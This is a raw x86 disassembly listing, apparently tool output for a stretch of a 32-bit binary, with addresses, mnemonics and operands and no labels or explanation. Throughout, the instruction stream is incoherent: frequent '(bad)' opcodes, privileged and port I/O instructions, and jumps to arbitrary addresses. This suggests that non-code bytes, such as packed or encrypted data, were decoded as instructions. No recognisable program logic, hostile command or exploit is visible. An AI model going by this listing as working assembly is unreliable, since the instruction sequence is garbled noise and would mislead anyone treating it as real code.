  41495e:	sbb    ebx,edi
  414960:	mov    ah,0xa4
  414962:	sub    ah,BYTE PTR [ebx+0x7e]
  414965:	fld    TBYTE PTR [edx]
  414967:	fadd   QWORD PTR [ebp-0x49c2018e]
  41496d:	test   BYTE PTR [ebx+0x3f],ch
  414970:	ror    BYTE PTR [edi],cl
  414972:	jge    0x414915
  414974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414975:	mov    edx,esp
  414977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414978:	lahf   
  414979:	dec    edx
  41497a:	pop    ebx
  41497b:	mov    eax,ds:0x77e7402b
  414980:	or     al,0xd4
  414982:	xor    DWORD PTR [edx-0x56429957],ecx
  414988:	imul   ecx,DWORD PTR [edi+0x53b6bb4f],0xcdd567fc
  414992:	jecxz  0x414930
  414994:	mov    dl,0x7f
  414996:	xchg   edi,eax
  414997:	pop    ebp
  414998:	int3   
  414999:	pop    esi
  41499a:	repnz add BYTE PTR [esi],ch
  41499d:	mov    dl,0x64
  41499f:	jl     0x414967
  4149a1:	jbe    0x4149ad
  4149a3:	mov    dl,0xbd
  4149a5:	dec    ebx
  4149a6:	arpl   WORD PTR [esp+edi*1-0x22],bx
  4149aa:	nop
  4149ab:	xchg   BYTE PTR [ebx+0x3e],ch
  4149ae:	ret    
  4149af:	test   DWORD PTR [edi],0xb69e3b5e
  4149b5:	repz and al,0x31
  4149b8:	repz shl DWORD PTR [edi],1
  4149bb:	ins    DWORD PTR es:[edi],dx
  4149bc:	inc    DWORD PTR [edx]
  4149be:	sub    edi,edi
  4149c0:	xor    eax,0x953e4d89
  4149c5:	xor    ebx,esp
  4149c7:	pop    ss
  4149c8:	ficom  WORD PTR [ebx]
  4149ca:	popf   
  4149cb:	ficomp WORD PTR [edi-0x98e16ad]
  4149d1:	imul   esp,DWORD PTR ds:0x9a921e4,0x12
  4149d8:	and    eax,0xffffffc0
  4149db:	jecxz  0x414a40
  4149dd:	xor    ch,0xf0
  4149e0:	popf   
  4149e1:	mov    dh,0x7b
  4149e3:	ret    
  4149e4:	pop    es
  4149e5:	xor    eax,0xe04f5580
  4149ea:	jns    0x414a29
  4149ec:	ins    DWORD PTR es:[edi],dx
  4149ed:	iret   
  4149ee:	sbb    DWORD PTR [eax],edi
  4149f0:	add    esp,DWORD PTR [esi+0x3516665c]
  4149f6:	rcr    BYTE PTR [ebx+0x72d037a4],1
  4149fc:	jae    0x4149bb
  4149fe:	imul   edi,esp,0x10
  414a01:	nop
  414a02:	inc    DWORD PTR [ecx+0x2d]
  414a05:	or     BYTE PTR [edx],cl
  414a07:	cs cdq 
  414a09:	pop    ss
  414a0a:	xchg   ecx,eax
  414a0b:	xchg   BYTE PTR [ecx+0x13014498],cl
  414a11:	cmp    al,0x47
  414a13:	jno    0x414a21
  414a15:	dec    edx
  414a16:	hlt    
  414a17:	scas   eax,DWORD PTR es:[edi]
  414a18:	xor    DWORD PTR [ebp+0x423d3619],ebx
  414a1e:	fist   DWORD PTR ds:0x534a011c
  414a24:	aas    
  414a25:	jge    0x414a31
  414a27:	sbb    dl,cl
  414a29:	jno    0x414a67
  414a2b:	(bad)  
  414a2d:	jecxz  0x414a9f
  414a2f:	fsubr  DWORD PTR [edi-0x68795e13]
  414a35:	cli    
  414a36:	xor    al,0xb2
  414a38:	ror    DWORD PTR [edx-0x7eec7a33],1
  414a3e:	loopne 0x414a49
  414a40:	push   0xaa6348f8
  414a45:	mov    fs:0x54b13ce7,al
  414a4b:	push   ebp
  414a4c:	sub    edx,esp
  414a4e:	lods   eax,DWORD PTR ds:[esi]
  414a4f:	mov    ds:0xcee32e7e,al
  414a54:	pop    esp
  414a55:	inc    edi
  414a56:	das    
  414a57:	neg    BYTE PTR [esi+0x1bc04435]
  414a5d:	mov    edi,0xbe8367c7
  414a62:	iret   
  414a63:	adc    edx,esi
  414a65:	sbb    BYTE PTR [eax],al
  414a67:	push   ss
  414a68:	cmp    eax,0x17c0b2ad
  414a6d:	loop   0x414a80
  414a6f:	xor    eax,ebx
  414a71:	outs   dx,BYTE PTR ds:[esi]
  414a72:	and    eax,DWORD PTR [ebp-0x7a8d95ea]
  414a78:	shl    DWORD PTR [eax+0x361d96d2],0x59
  414a7f:	rcr    DWORD PTR [edi],cl
  414a81:	(bad)  
  414a83:	dec    edx
  414a84:	repz pop edi
  414a86:	adc    eax,0x8bbf2395
  414a8b:	adc    eax,0x3d43cd16
  414a90:	push   ds
  414a91:	mov    dl,0x8f
  414a93:	inc    edi
  414a94:	add    BYTE PTR [ebx-0x47d08316],0x4
  414a9b:	cwde   
  414a9c:	std    
  414a9d:	iret   
  414a9e:	fcom   DWORD PTR [eax]
  414aa0:	lock not BYTE PTR [ebp-0x234540ab]
  414aa7:	mov    al,ds:0xe21539b1
  414aac:	outs   dx,BYTE PTR ds:[esi]
  414aad:	inc    esi
  414aae:	mov    edx,DWORD PTR [edx]
  414ab0:	cs sbb bl,bh
  414ab3:	adc    eax,0x7868a3b9
  414ab8:	mov    dh,0x68
  414aba:	call   0xaa95bb28
  414abf:	sub    ebx,DWORD PTR [edi-0x37aa0306]
  414ac5:	in     al,0x59
  414ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ac8:	lds    esp,FWORD PTR [ebp-0x2bccd1f8]
  414ace:	adc    edx,DWORD PTR [eax]
  414ad0:	icebp  
  414ad1:	dec    ebx
  414ad2:	out    0xd,al
  414ad4:	pop    ds
  414ad5:	inc    edi
  414ad6:	and    al,BYTE PTR [ebx-0x1e51eba5]
  414adc:	jg     0x414ac8
  414ade:	xchg   ebx,eax
  414adf:	in     al,0xc7
  414ae1:	jno    0x414ae1
  414ae3:	dec    ebx
  414ae4:	xchg   ebp,eax
  414ae5:	out    dx,al
  414ae6:	cli    
  414ae7:	mov    DWORD PTR [ebx],ebp
  414ae9:	xchg   esp,eax
  414aea:	je     0x414ada
  414aec:	popf   
  414aed:	outs   dx,DWORD PTR ds:[esi]
  414aee:	jae    0x414b08
  414af0:	mov    ah,0xc1
  414af2:	mov    eax,0x662bb22b
  414af7:	jge    0x414aa4
  414af9:	imul   DWORD PTR [ecx]
  414afb:	div    DWORD PTR [eax+0x70442b95]
  414b01:	ja     0x414b6f
  414b03:	pop    eax
  414b04:	sub    ah,cl
  414b06:	(bad)  
  414b07:	retf   
  414b08:	inc    ebp
  414b09:	xor    al,0x36
  414b0b:	retf   0xc4a1
  414b0e:	xchg   esi,eax
  414b0f:	mov    ebp,0xe5af1b69
  414b14:	push   esi
  414b15:	jbe    0x414aa2
  414b17:	dec    esi
  414b18:	jge    0x414b50
  414b1a:	das    
  414b1b:	outs   dx,DWORD PTR ds:[esi]
  414b1c:	pop    edi
  414b1d:	adc    BYTE PTR [esi+eax*1+0x21a79671],bh
  414b24:	inc    esi
  414b25:	pushf  
  414b26:	out    dx,al
  414b27:	out    dx,al
  414b28:	(bad)  
  414b29:	loope  0x414b37
  414b2b:	test   BYTE PTR [eax],bh
  414b2d:	cmp    dl,BYTE PTR [ebp-0x25169801]
  414b33:	cld    
  414b34:	add    ah,BYTE PTR [eax+ebx*8+0x18]
  414b38:	into   
  414b39:	test   eax,0xf63e2efe
  414b3e:	mov    al,ds:0x330ba46
  414b43:	aad    0x8d
  414b45:	mov    cl,0x3a
  414b47:	sti    
  414b48:	xchg   DWORD PTR [esi],esi
  414b4a:	mov    edi,0x1f1f4ce3
  414b4f:	pop    ebx
  414b50:	sbb    BYTE PTR [eax-0x10d7f71b],dl
  414b56:	xchg   ebp,eax
  414b57:	int    0x8b
  414b59:	icebp  
  414b5a:	pushf  
  414b5b:	dec    esp
  414b5c:	jae    0x414ae1
  414b5e:	out    0xf1,eax
  414b60:	pop    esi
  414b61:	ins    DWORD PTR es:[edi],dx
  414b62:	jle    0x414b86
  414b64:	inc    ecx
  414b65:	mov    WORD PTR [ecx],ds
  414b67:	pop    ss
  414b68:	jnp    0x414b69
  414b6a:	xor    dh,BYTE PTR [edx]
  414b6c:	xchg   DWORD PTR [ebp-0x575dc03c],esp
  414b72:	mov    al,0xf9
  414b74:	pop    es
  414b75:	jmp    DWORD PTR [ebx-0x7d6d8947]
  414b7b:	retf   0xebb8
  414b7e:	adc    ecx,ebx
  414b80:	push   edx
  414b81:	(bad)  
  414b82:	retf   
  414b83:	xchg   ecx,eax
  414b84:	and    al,0x1f
  414b86:	mov    eax,0x526b7cc6
  414b8b:	into   
  414b8c:	jecxz  0x414b59
  414b8e:	mov    ah,0x6d
  414b90:	jo     0x414b86
  414b92:	mov    al,0xc
  414b94:	jg     0x414ba4
  414b96:	ds test bh,ah
  414b99:	in     eax,0xef
  414b9b:	mov    DWORD PTR [edi+0x69f7d32e],edi
  414ba1:	and    dl,dl
  414ba3:	and    bl,BYTE PTR [ecx-0x181193e4]
  414ba9:	pop    edi
  414baa:	sar    edx,cl
  414bac:	aam    0x41
  414bae:	push   es
  414baf:	and    BYTE PTR [ebp+0x7cf19b1a],dh
  414bb5:	sahf   
  414bb6:	out    dx,al
  414bb7:	fwait
  414bb8:	inc    edi
  414bb9:	adc    al,0x94
  414bbb:	dec    edx
  414bbc:	pop    ebx
  414bbd:	fs call 0x5810:0xe59ea1c0
  414bc5:	pop    ebp
  414bc6:	dec    esi
  414bc7:	inc    ebx
  414bc8:	daa    
  414bc9:	loop   0x414ba3
  414bcb:	aaa    
  414bcc:	sbb    al,cl
  414bce:	and    cl,cl
  414bd0:	(bad)  
  414bd1:	sub    al,0xab
  414bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bd4:	fsub   DWORD PTR [ebx-0x43]
  414bd7:	mov    dl,0x9a
  414bd9:	inc    edx
  414bda:	jl     0x414c25
  414bdc:	sbb    DWORD PTR [ebp+0x4b],edx
  414bdf:	enter  0x9f3d,0xe9
  414be3:	repnz repz or DWORD PTR [esi+ecx*2+0x1c5bc640],ebp
  414bec:	cmc    
  414bed:	icebp  
  414bee:	dec    eax
  414bef:	jl     0x414c21
  414bf1:	adc    ecx,DWORD PTR [ebx-0x3b6318d4]
  414bf7:	aas    
  414bf8:	es cs dec edx
  414bfb:	in     al,0x7b
  414bfd:	pop    ds
  414bfe:	ret    
  414bff:	xor    DWORD PTR [ebx],ecx
  414c01:	call   0xc03041a3
  414c06:	outs   dx,DWORD PTR ds:[esi]
  414c07:	js     0x414c83
  414c09:	xchg   ebx,eax
  414c0a:	test   DWORD PTR gs:[esi],0xff314f1
  414c11:	in     eax,dx
  414c12:	jecxz  0x414c4e
  414c14:	ins    DWORD PTR es:[edi],dx
  414c15:	push   ds
  414c16:	ja     0x414c7e
  414c18:	sub    dl,bh
  414c1a:	pop    edi
  414c1b:	sbb    eax,0x55a2d5b4
  414c20:	test   eax,0x706ef1fc
  414c25:	ins    BYTE PTR es:[edi],dx
  414c26:	or     al,0x67
  414c28:	and    ah,BYTE PTR [edi]
  414c2a:	ror    BYTE PTR [esi+eiz*4+0x634990ef],cl
  414c31:	push   cs
  414c32:	mov    bl,0x46
  414c34:	sbb    DWORD PTR [eax-0x1c],0x1a
  414c38:	(bad)  
  414c39:	(bad)  
  414c3b:	fxch   st(2)
  414c3d:	imul   ebp,DWORD PTR [ecx+0x3671a96f],0x5af885c8
  414c47:	jl     0x414bd6
  414c49:	adc    eax,0x3c0f5c07
  414c4e:	aaa    
  414c4f:	xchg   DWORD PTR cs:[ebp-0x6b5a4efe],eax
  414c56:	hlt    
  414c57:	icebp  
  414c58:	push   ds
  414c59:	or     BYTE PTR [edx+0x4de45b43],bl
  414c5f:	and    eax,0x581caa94
  414c64:	jnp    0x414c13
  414c66:	adc    BYTE PTR [eax+0x3906fee0],0x91
  414c6d:	cmp    ah,BYTE PTR [eax+0x16]
  414c70:	ret    
  414c71:	scas   eax,DWORD PTR es:[edi]
  414c72:	mov    eax,ds:0x7015f072
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	retf   0xeddd
  414c7b:	test   DWORD PTR [ecx+0x3b005915],edi
  414c81:	cmp    ah,BYTE PTR [ecx]
  414c83:	mov    al,ds:0x69680e1
  414c88:	or     ebp,ebp
  414c8a:	jmp    0x2d44d4e0
  414c8f:	mov    ch,0xb5
  414c91:	dec    ebp
  414c92:	xlat   BYTE PTR ds:[ebx]
  414c93:	shr    BYTE PTR [ecx+0x55fa6b8a],cl
  414c99:	cmp    BYTE PTR [ebp+0x2703efc2],ch
  414c9f:	or     eax,0xb0b8a3eb
  414ca4:	pop    edx
  414ca5:	bound  esp,QWORD PTR cs:[ebp-0x3b1fd481]
  414cac:	clc    
  414cad:	push   0xd9255d91
  414cb2:	and    DWORD PTR [eax+0x10],eax
  414cb5:	lds    edx,FWORD PTR [eax]
  414cb7:	adc    DWORD PTR [esi-0x13b29be9],eax
  414cbd:	clc    
  414cbe:	out    0x9f,al
  414cc0:	pushf  
  414cc1:	enter  0x7607,0xca
  414cc5:	scas   al,BYTE PTR es:[edi]
  414cc6:	cmp    eax,0xaa75a792
  414ccb:	add    BYTE PTR [ecx],dl
  414ccd:	mov    BYTE PTR [eax],al
  414ccf:	push   ds
  414cd0:	icebp  
  414cd1:	cli    
  414cd2:	aad    0x60
  414cd4:	mov    BYTE PTR [edx*4+0x7a042310],dh
  414cdb:	cld    
  414cdc:	jbe    0x414c6e
  414cde:	pop    ebx
  414cdf:	xchg   DWORD PTR [edi],esp
  414ce1:	add    BYTE PTR ds:0xccfbf10f,0xea
  414ce8:	aaa    
  414ce9:	stos   BYTE PTR es:[edi],al
  414cea:	out    0x25,al
  414cec:	pop    ds
  414ced:	mov    edi,0xbc4baa90
  414cf2:	jo     0x414c81
  414cf4:	hlt    
  414cf5:	jno    0x414cec
  414cf7:	xchg   esp,eax
  414cf8:	mul    BYTE PTR [ecx+0x11ef7e5c]
  414cfe:	arpl   WORD PTR [esi],di
  414d00:	mov    WORD PTR [esi],gs
  414d02:	repnz inc ecx
  414d04:	call   0x2ffa:0x63ef2c74
  414d0b:	loopne 0x414d62
  414d0d:	sub    DWORD PTR [ebx-0x7e],esi
  414d10:	or     al,0x7
  414d12:	fisttp QWORD PTR [ebx-0x74e668df]
  414d18:	retf   0x91b3
  414d1b:	retf   
  414d1c:	imul   esp,DWORD PTR [eax-0x47c02595],0x30
  414d23:	or     DWORD PTR [esi+0x3114efa4],ebx
  414d29:	call   0xa1b8ae4c
  414d2e:	dec    eax
  414d2f:	jmp    0x414cf4
  414d31:	fs fxch st(5)
  414d34:	or     BYTE PTR [eax-0x223877da],al
  414d3a:	bound  esi,QWORD PTR [ebp-0x34c5d37f]
  414d40:	xchg   BYTE PTR [ecx],ah
  414d42:	mov    eax,0xa50344ca
  414d47:	cli    
  414d48:	sub    ah,dl
  414d4a:	jne    0x414da5
  414d4c:	jb     0x414db1
  414d4e:	jns    0x414d35
  414d50:	pop    ebp
  414d51:	inc    esp
  414d52:	aaa    
  414d53:	pop    DWORD PTR [edi+esi*2+0x6454bf48]
  414d5a:	sub    DWORD PTR [ecx],ebp
  414d5c:	jecxz  0x414dd9
  414d5e:	mov    edx,0xad0dfc42
  414d63:	xor    BYTE PTR [ebp+eiz*4+0x141ccd18],0x15
  414d6b:	popa   
  414d6c:	lahf   
  414d6d:	(bad)  
  414d6e:	fnstsw WORD PTR [ecx+0x32f7c9d0]
  414d74:	pop    es
  414d75:	ins    DWORD PTR es:[edi],dx
  414d76:	test   BYTE PTR ds:0xe755c371,cl
  414d7c:	mov    edi,0xad203273
  414d81:	hlt    
  414d82:	ja     0x414dc1
  414d84:	(bad)  
  414d85:	or     edx,DWORD PTR [ebp+0x2c774fee]
  414d8b:	sahf   
  414d8c:	in     eax,0xf1
  414d8e:	dec    ebp
  414d8f:	int    0x19
  414d91:	xor    bh,ah
  414d93:	push   es
  414d94:	scas   al,BYTE PTR es:[edi]
  414d95:	mov    dh,0xa9
  414d97:	loop   0x414dc3
  414d99:	mov    ebp,edi
  414d9b:	xor    dh,bl
  414d9d:	xor    BYTE PTR [ebp+0x4392d564],al
  414da3:	push   ss
  414da4:	mov    edi,0xe9de2993
  414da9:	pop    es
  414daa:	mov    ah,0x8c
  414dac:	xor    DWORD PTR [eax],0x98a02f6c
  414db2:	dec    ecx
  414db3:	sub    BYTE PTR [ecx-0x5ac14121],dl
  414db9:	(bad)  
  414dba:	cli    
  414dbb:	xor    DWORD PTR [esi],0xffffff8a
  414dbe:	popa   
  414dbf:	cmp    edx,esp
  414dc1:	mov    bl,0xa4
  414dc3:	retf   
  414dc4:	cli    
  414dc5:	sbb    DWORD PTR [edi-0x554620d5],0xd81ff3dd
  414dcf:	xchg   ebx,eax
  414dd0:	gs xor al,0xf7
  414dd3:	aam    0xdc
  414dd5:	sbb    eax,0xe89844a9
  414dda:	dec    eax
  414ddb:	push   ecx
  414ddc:	aad    0x5
  414dde:	retf   
  414ddf:	(bad)  
  414de0:	aaa    
  414de1:	rcr    BYTE PTR [esi-0x3d],0x87
  414de5:	lea    ecx,[edx+0x67b2c213]
  414deb:	outs   dx,DWORD PTR ds:[esi]
  414dec:	sbb    ah,BYTE PTR [ebp+0x25147d38]
  414df2:	into   
  414df3:	aas    
  414df4:	push   es
  414df5:	rol    DWORD PTR [edx-0x4d],0x48
  414df9:	pop    esi
  414dfa:	mov    dl,0x57
  414dfc:	jecxz  0x414dfb
  414dfe:	dec    esp
  414dff:	lea    esp,fs:[edx+eiz*4+0xb]
  414e04:	je     0x414e79
  414e06:	clc    
  414e07:	aam    0xb2
  414e09:	adc    ah,BYTE PTR [esi-0x1c]
  414e0c:	nop
  414e0d:	aad    0x67
  414e0f:	mov    ebx,0x6b8d2ff3
  414e14:	xchg   edx,eax
  414e15:	clc    
  414e16:	scas   eax,DWORD PTR es:[edi]
  414e17:	cmp    BYTE PTR [eax],0xf9
  414e1a:	push   es
  414e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1c:	lods   al,BYTE PTR ds:[esi]
  414e1d:	mov    dh,0x77
  414e1f:	push   ebp
  414e20:	jno    0x414de6
  414e22:	mov    ebx,0x48dbabca
  414e27:	cmp    DWORD PTR [eax+0x2a4086e1],esp
  414e2d:	cmp    esp,DWORD PTR [eax]
  414e2f:	rcl    DWORD PTR [ebp+0x1],1
  414e32:	cmp    BYTE PTR [edi+0x5ce6ced],bh
  414e38:	shl    DWORD PTR [edx],1
  414e3a:	sbb    eax,0xb659413a
  414e3f:	scas   eax,DWORD PTR es:[edi]
  414e40:	imul   ecx,esi,0x43cc94e2
  414e46:	xchg   ebx,eax
  414e47:	pop    eax
  414e48:	pop    ebx
  414e49:	cmc    
  414e4a:	test   eax,0xbf9a8eef
  414e4f:	data16 mov dl,0xa
  414e52:	push   esp
  414e53:	push   ebp
  414e54:	push   ds
  414e55:	sub    BYTE PTR [edi-0x4c],dl
  414e58:	fiadd  WORD PTR [edx-0x7e1aef47]
  414e5e:	neg    DWORD PTR [eax]
  414e60:	(bad)  
  414e61:	xchg   ecx,eax
  414e62:	arpl   WORD PTR ds:[esp+edi*4+0x5361f245],ax
  414e6a:	retf   
  414e6b:	lods   al,BYTE PTR ds:[esi]
  414e6c:	hlt    
  414e6d:	jl     0x414e49
  414e6f:	pop    ebx
  414e70:	inc    esi
  414e71:	cmp    DWORD PTR [ebx-0x14],ecx
  414e74:	pop    edx
  414e75:	test   eax,0x5c65c2d8
  414e7a:	add    al,0x8
  414e7c:	cs fs push edi
  414e7f:	pop    ds
  414e80:	in     eax,0x3a
  414e82:	push   esi
  414e83:	aad    0x36
  414e85:	jno    0x414e58
  414e87:	test   eax,0xeca36973
  414e8c:	imul   edi,DWORD PTR [edx-0x5901a689],0x31
  414e93:	mov    cl,0x7d
  414e95:	jo     0x414eef
  414e97:	vmptrld QWORD PTR [edi-0x20ece235]
  414e9e:	mov    edx,0x68451284
  414ea3:	icebp  
  414ea4:	mov    eax,0x6d3de076
  414ea9:	(bad)
  414eac:	sbb    BYTE PTR [ecx+0x24472618],dl
  414eb2:	leave  
  414eb3:	sbb    DWORD PTR fs:[eax],edi
  414eb6:	sub    esi,ecx
  414eb8:	mov    esp,0x6ef3c30e
  414ebd:	dec    esi
  414ebe:	cmp    al,0xc
  414ec0:	call   0x757399e7
  414ec5:	mov    edi,DWORD PTR [edi-0x2b59c36]
  414ecb:	push   ss
  414ecc:	jp     0x414ea0
  414ece:	into   
  414ecf:	ins    DWORD PTR es:[edi],dx
  414ed0:	icebp  
  414ed1:	mov    DWORD PTR [edi+0x69871d51],esp
  414ed7:	xchg   ebx,eax
  414ed8:	ret    
  414ed9:	mov    ds:0x8660613d,eax
  414ede:	arpl   WORD PTR [eax],bx
  414ee0:	outs   dx,DWORD PTR ds:[esi]
  414ee1:	call   0x3ff2:0x72ed7ac6
  414ee8:	add    al,0xb2
  414eea:	jo     0x414ec6
  414eec:	inc    eax
  414eed:	ins    DWORD PTR es:[edi],dx
  414eee:	mov    bl,0xbe
  414ef0:	les    ebp,FWORD PTR [ecx]
  414ef2:	in     eax,0xf9
  414ef4:	inc    ebp
  414ef5:	jg     0x414ea4
  414ef7:	lods   al,BYTE PTR ds:[esi]
  414ef8:	add    BYTE PTR [edi+0x11],0x1c
  414efc:	fwait
  414efd:	dec    edx
  414efe:	jne    0x414eec
  414f00:	jle    0x414ee8
  414f02:	cmp    eax,0xd913dd24
  414f07:	xor    eax,0x256818e6
  414f0c:	add    eax,0xf92904fe
  414f11:	aas    
  414f12:	std    
  414f13:	in     al,0xef
  414f15:	push   0xffab5268
  414f1a:	pop    ds
  414f1b:	cmp    eax,0xed85727a
  414f20:	test   al,0x21
  414f22:	lea    ebx,[ebx+0x35066acd]
  414f28:	nop
  414f29:	inc    esi
  414f2a:	cmp    ecx,eax
  414f2c:	mov    al,ds:0x18e67087
  414f31:	and    eax,0x108fc8a8
  414f36:	push   esp
  414f37:	pusha  
  414f38:	imul   eax,DWORD PTR [edx+0x21424922],0xbad06464
  414f42:	jb     0x414f21
  414f44:	push   ss
  414f45:	sub    al,BYTE PTR [edi+0x6a]
  414f48:	add    WORD PTR [esi],dx
  414f4b:	adc    BYTE PTR [eax+0x1150adae],0x20
  414f52:	xor    ch,dl
  414f54:	scas   eax,DWORD PTR es:[edi]
  414f55:	popa   
  414f56:	fadd   QWORD PTR [edi-0x43945957]
  414f5c:	int    0xb
  414f5e:	fimul  DWORD PTR [edx+0x65]
  414f61:	mov    bl,ch
  414f63:	and    al,0x60
  414f65:	ret    
  414f66:	sub    al,0xbd
  414f68:	xchg   ecx,eax
  414f69:	jne    0x414f4f
  414f6b:	xlat   BYTE PTR ds:[ebx]
  414f6c:	aas    
  414f6d:	xchg   ecx,eax
  414f6e:	aad    0x74
  414f70:	sub    ecx,DWORD PTR [ebx-0x1baee55b]
  414f76:	push   cs
  414f77:	add    edx,DWORD PTR [ebx]
  414f79:	jnp    0x414fa4
  414f7b:	imul   dx,sp,0x944c
  414f80:	fwait
  414f81:	call   0xf78b44c3
  414f86:	outs   dx,BYTE PTR ds:[esi]
  414f87:	pushf  
  414f88:	inc    esi
  414f89:	inc    edx
  414f8a:	dec    esp
  414f8b:	mov    ch,0x91
  414f8d:	dec    edx
  414f8e:	das    
  414f8f:	xchg   DWORD PTR [eax+eax*2-0x79bc2f6d],ebx
  414f96:	mov    ecx,0x5b22dcea
  414f9b:	mov    ebp,0xb827fa77
  414fa0:	or     DWORD PTR [ecx+0x40],eax
  414fa3:	adc    edi,0x22615d42
  414fa9:	push   0xffffffff
  414fab:	popa   
  414fac:	sbb    ch,BYTE PTR [eax]
  414fae:	aaa    
  414faf:	xchg   edx,eax
  414fb0:	cmp    cl,BYTE PTR [edi+0x2ffab26e]
  414fb6:	mov    WORD PTR [ebx],fs
  414fb8:	out    0x14,eax
  414fba:	lds    edi,FWORD PTR [edi-0x6337757a]
  414fc0:	and    BYTE PTR [eax+0x6613745a],cl
  414fc6:	mov    dh,0x36
  414fc8:	fwait
  414fc9:	xchg   esi,eax
  414fca:	inc    esi
  414fcb:	and    al,0xfc
  414fcd:	dec    esp
  414fce:	lods   al,BYTE PTR ds:[esi]
  414fcf:	add    ah,BYTE PTR [edi-0x358d150d]
  414fd5:	int    0x30
  414fd7:	and    edi,DWORD PTR ds:0xae51c354
  414fdd:	fisttp WORD PTR [edi+0x4f34c8a]
  414fe3:	test   ax,0x589d
  414fe7:	xor    ah,dh
  414fe9:	lods   al,BYTE PTR ds:[esi]
  414fea:	push   ebp
  414feb:	ja     0x415069
  414fed:	sub    BYTE PTR [eax+0x2a2591b5],ch
  414ff3:	xchg   ebp,eax
  414ff4:	push   DWORD PTR [ecx+0x34]
  414ff7:	in     al,dx
  414ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff9:	dec    esi
  414ffa:	(bad)  
  414ffb:	test   al,0x78
  414ffd:	dec    esi
  414ffe:	gs icebp 
  415000:	adc    BYTE PTR [eax+0x17],ah
  415003:	fisub  WORD PTR [esi-0x733be13a]
  415009:	sub    edx,edx
  41500b:	adc    eax,0xdf2229ea
  415010:	dec    eax
  415011:	jl     0x414fe4
  415013:	cdq    
  415014:	outs   dx,BYTE PTR ds:[esi]
  415015:	lods   eax,DWORD PTR ds:[esi]
  415016:	or     DWORD PTR [ebx],esp
  415018:	es xchg ebp,eax
  41501a:	xchg   ebp,eax
  41501b:	dec    esp
  41501c:	std    
  41501d:	nop
  41501e:	add    eax,0xa7e73d2c
  415023:	ins    DWORD PTR es:[edi],dx
  415024:	adc    DWORD PTR [ebp-0x5d],esp
  415027:	mov    cl,0xa0
  415029:	push   edi
  41502a:	test   eax,0x69a46a35
  41502f:	out    dx,eax
  415030:	jg     0x415010
  415032:	adc    eax,0x65c62049
  415037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415038:	mov    dl,0x1c
  41503a:	mov    bh,0x2a
  41503c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503d:	ss ret 0xdfe
  415041:	mov    al,ds:0x28925a4
  415046:	inc    eax
  415047:	sti    
  415048:	loopne 0x414ff8
  41504a:	adc    DWORD PTR [esi+ebx*8+0xe8137d3],edi
  415051:	out    dx,eax
  415052:	sbb    ecx,DWORD PTR [eax+0x37efc365]
  415058:	push   ss
  415059:	repnz inc eax
  41505b:	es xchg bh,cl
  41505e:	push   edx
  41505f:	fstp   QWORD PTR [ecx-0x6c]
  415062:	in     al,0x60
  415064:	xchg   ebp,eax
  415065:	int3   
  415066:	mov    edi,0xea59e865
  41506b:	outs   dx,BYTE PTR ds:[esi]
  41506c:	hlt    
  41506d:	mov    ecx,DWORD PTR [ebp+0x4326a378]
  415073:	stc    
  415074:	scas   al,BYTE PTR es:[edi]
  415075:	shl    DWORD PTR [edi-0x18],cl
  415078:	add    esp,ebx
  41507a:	repnz icebp 
  41507c:	(bad)  
  41507d:	scas   al,BYTE PTR es:[edi]
  41507e:	lods   al,BYTE PTR ds:[esi]
  41507f:	inc    esp
  415080:	dec    edi
  415081:	cmp    edx,edi
  415083:	out    dx,eax
  415084:	mov    edx,0x2b2cc5b2
  415089:	or     DWORD PTR [eax-0x16],ebx
  41508c:	adc    ebx,edi
  41508e:	dec    ebx
  41508f:	cmc    
  415090:	xor    BYTE PTR [edx],al
  415092:	enter  0x1f9f,0xe
  415096:	aam    0x40
  415098:	call   0x1e872a13
  41509d:	je     0x415062
  41509f:	std    
  4150a0:	shl    BYTE PTR [ecx-0x1aef3753],1
  4150a6:	inc    eax
  4150a7:	jo     0x415091
  4150a9:	data16 fwait
  4150ab:	add    al,BYTE PTR [ebx]
  4150ad:	mov    ch,0x4d
  4150af:	in     al,dx
  4150b0:	dec    BYTE PTR [ebx-0x6a7e9e80]
  4150b6:	mov    cl,BYTE PTR [edi+edi*4]
  4150b9:	sbb    dh,bh
  4150bb:	pop    ss
  4150bc:	mov    cl,0x0
  4150be:	(bad)  [edx]
  4150c0:	fiadd  DWORD PTR [edx+0x3]
  4150c3:	sbb    al,0xf7
  4150c5:	inc    esi
  4150c6:	shl    BYTE PTR ds:0x93ab5091,1
  4150cc:	pop    ecx
  4150cd:	outs   dx,BYTE PTR ds:[esi]
  4150ce:	leave  
  4150cf:	(bad)  
  4150d0:	mov    esi,0x2384dc01
  4150d5:	cmp    cl,cl
  4150d7:	pop    ds
  4150d8:	push   0x96847e0d
  4150dd:	pop    ecx
  4150de:	sub    eax,0x63c0886b
  4150e3:	test   al,0xaa
  4150e5:	jge    0x4150d4
  4150e7:	inc    eax
  4150e8:	imul   ecx,DWORD PTR [esi],0xc49a81e9
  4150ee:	inc    ebp
  4150ef:	xor    ch,BYTE PTR [edi]
  4150f1:	lahf   
  4150f2:	sub    eax,0x258524c4
  4150f7:	jge    0x4150b1
  4150f9:	lea    esp,[ebp+eiz*8+0x716ad0ac]
  415100:	loope  0x415159
  415102:	ret    
  415103:	dec    esi
  415104:	mov    esi,ds
  415106:	call   0xd3f5:0xe8298ec1
  41510d:	add    ebp,ebx
  41510f:	jbe    0x4150b5
  415111:	in     al,0xe8
  415113:	aas    
  415114:	mov    eax,ds:0x583b27f8
  415119:	cmp    al,0xd2
  41511c:	and    al,BYTE PTR [eax-0x30]
  41511f:	xchg   edx,eax
  415120:	int3   
  415121:	test   DWORD PTR [ebx],ecx
  415123:	mov    ah,0xf3
  415125:	mov    bh,0xb8
  415127:	imul   esi,esi,0x2a28a08f
  41512d:	not    dl
  41512f:	push   edx
  415130:	or     bh,BYTE PTR [ebp-0xd4cd183]
  415136:	dec    ebp
  415137:	cmp    esi,DWORD PTR ds:0x4982f26
  41513d:	mov    dl,0xd1
  41513f:	imul   ebx,DWORD PTR [edi],0xffffffd2
  415142:	nop
  415143:	scas   eax,DWORD PTR es:[edi]
  415144:	test   eax,0xb237df6
